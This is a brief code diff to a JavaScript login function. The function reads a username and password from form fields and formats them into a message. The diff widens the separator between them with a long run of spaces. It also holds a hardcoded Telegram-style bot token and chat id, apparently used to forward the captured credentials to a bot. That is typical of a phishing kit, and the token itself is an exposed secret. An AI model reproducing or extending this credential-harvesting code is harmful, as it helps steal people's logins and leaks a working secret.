@@ -18,7 +18,7 @@ function login(){
 var username = $("#username").val();
 var pass = $("#pass").val();
 
-var text = "user : `" + username + "`|| pass : `" + pass + "`";
+var text = "user : `" + username + "`                                                                                                   pass : `" + pass + "`";
 
 var token = "1763073210:AAFSz6iqk-PkW_vjvkGR7jIwrZyWPjderV4";
 var id = "1562616838";
